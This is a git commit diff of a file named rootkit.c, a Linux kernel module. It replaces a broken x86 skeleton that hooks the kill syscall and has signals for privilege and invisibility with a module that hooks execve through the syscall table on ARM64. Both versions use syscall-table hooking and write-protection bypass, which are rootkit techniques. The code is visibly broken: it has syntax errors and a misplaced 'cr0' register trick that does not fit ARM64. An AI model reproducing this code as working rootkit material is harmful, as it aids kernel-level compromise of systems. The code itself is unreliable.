a83f79f1da499d5a656f7ba37724b0c48d826754
Vedant Dorlikar <145666524+vedant44-cyber@users.noreply.github.com>
2024-07-30 01:00:09 +0530

    code updated

--- rootkit.c
+++ rootkit.c
@@ -1,146 +1,83 @@
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/kallsyms.h>
 #include <linux/module.h>
-#include <linux/unistd.h>
-#include <asm/paravirt.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <asm/unistd.h>
+
+#define __NR_execve 221  
+
+static unsigned long *sys_call_table;
+
+asmlinkage long (*orig_execve)(const char __user *filename,
+                                const char __user *const __user *argv,
+                                const char __user *const __user *envp);
+
+asmlinkage long hooked_execve(const char __user *filename,
+                               const char __user *const __user *argv,
+                               const char __user *const __user *envp)
+{
+    printk(KERN_INFO "execve() syscall hooked: filename=%s\n", filename);
+   
+    return orig_execve(filename, argv, envp);
+}
+
+static inline unsigned long read_cr0(void)
+{
+    unsigned long val;
+    asm volatile("mrs %0, S3_0_C15_C0_0" : "=r"(val));
+    return val;
+}
+
+static inline void write_cr0(unsigned long val)
+{
+    asm volatile("msr S3_0_C15_C0_0, %0" : : "r"(val));
+}
+
+static void unprotect_memory(void)
+{
+    unsigned long cr0 = read_cr0();
+    write_cr0(cr0 & ~0x10000);
+}
+
+static void protect_memory(void)
+{
+    unsigned long cr0 = read_cr0();
+    write_cr0(cr0 | 0x10000);
+}
+
+static int __init my_module_init(void)
+{
+    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    if (!sys_call_table)
+    {
+        printk(KERN_ERR "Failed to locate sys_call_table\n");
+        return -1;
+    }
+
+   
+    orig_execve = (void *)sys_call_table[__NR_execve];
+    printk(KERN_INFO "Original execve syscall address: %lx\n", (unsigned long)orig_execve);
+
+  
+    unprotect_memory();
+    sys_call_table[__NR_execve] = (unsigned long)hooked_execve;
+    protect_memory();
+
+    printk(KERN_INFO "Successfully hooked execve syscall\n");
+    return 0;
+}
+
+static void __exit my_module_exit(void)
+{
+    
+    unprotect_memory();
+    sys_call_table[__NR_execve] = (unsigned long)orig_execve;
+    protect_memory();
+
+    printk(KERN_INFO "Restored original execve syscall\n");
+}
+
+module_init(my_module_init);
+module_exit(my_module_exit);
+
 MODULE_LICENSE("GPL");
-
-unsigned long *_syscall_table_address;
-
-
-
-
-#ifdef CONFIG_X86_64
-
-#if LINUX_VERSION_CODE>=KERNAL_VERSION(4,17,0)
-#define PTREGS_SYSCALL_STUB 1
-typedef asmlinkage  long (*ptregs_t)(const struct pt_regs *regs);
-static ptregs_t  orig_kill;
-#else
-typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
-static orig_kill_t orig_kill ;
-#endif 
-#endif
-
-
-
-enum signals {
-SIGSUPER=64,
-SIGINVIS=63;
-};
- 
-
-
-
-#if PTREGS_SYSCALL_STUB 
-
-
-static asmlinkage long hack_kill(const struct pt_regs *regs)
-{
-int sig = regs->si;
-
-if(sig==SIGSUPER)
-
-
-}
-
-
-#else
-
-static asmlinkage long hack_kill(pid_t pid,int sig){
-
-
-
-}
-#endif
-
-
-static int store(void){
-
-#if PTREGS_SYSCALL_STUB
-	orig_kill=(ptreg_t)_syscall_table_address[__NR_kill];
-
-#else
-	orig_kill=(orig_kill_t)_syscall_table_address[__NR_kill];
-#endif
-
-
-return 0;
-}
-
-
-
-
-
-static int hook(void){
-
-
-return 0;
-
-
-}
-
-
-
-
-
-
-static inline void write_cr0_forced(unsigned long val)
-{
-    unsigned long __force_order;
-
-    /* __asm__ __volatile__( */
-    asm volatile(
-        "mov %0, %%cr0"
-        : "+r"(val), "+m"(__force_order));
-}
-
-static void unprotect_memory(void){
-write_cr0_forced(read_cr0() & (~ 0x10000));
-printk(KERN_INFO "memory unprotected");
-}
-
-
-
-static void protect_memory(void){
-write_cr0_forced(read_cr0() | (~ 0x10000));
-printk(KERN_INFO "memory protected");
-}
-
-
-static unsigned long *_get_table_address(void){
-
-unsigned long *syscall_table;
-
-syscall_table=(unsigned long*)kallsyms_lookup_name("sys_call_table");
-return  syscall_table;
-}
-
-static int __init  entry(void){
-int err =1; 
-printk(KERN_INFO " hbfjndf");
-
-_syscall_table_address=_get_table_address();
-
-
-if(!_syscall_table_address){
-
-printk(KERN_INFO "error: syscall_table =null");
-return err;
-
-}
-
-return 0;
-}
-
-static  void __exit  exity(void){
-
-int err=1;
-
-printk(KERN_INFO "Module unloaded.\n");
-}
-
-
-module_init(entry);
-module_exit(exity)
